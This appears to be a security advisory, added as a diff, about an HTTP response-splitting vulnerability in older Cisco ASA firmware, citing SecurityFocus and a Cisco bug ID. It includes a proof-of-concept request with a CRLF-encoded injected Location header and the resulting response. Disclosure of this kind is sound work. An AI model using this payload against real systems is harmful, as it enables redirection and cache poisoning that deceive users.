@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/41159/info
+
+Cisco Adaptive Security Response (ASA) is prone to an HTTP response-splitting vulnerability.
+
+Attackers can leverage this issue to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that try to entice client users into having a false sense of trust.
+
+Firmware versions prior to Cisco ASA 8.1(2) are vulnerable.
+
+This issue is being tracked by Cisco Bugid CSCsr09163.
+
+URL: http://www.example.com/%0d%0aLocation%3a%20http%3a%2f%2fwww%2egoogle%2ecom Request: GET http://www.example.com/%0d%0aLocation%3a%20http%3a%2f%2fwww%2egoogle%2ecom HTTP/1.0 Host: /www.example.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Response: HTTP/1.0 301 Moved Permanently Server: Web Server Location: https:///www.example2.com/ Location: http:///www.example3.com Content-Type: text/html Content-Length: 125 
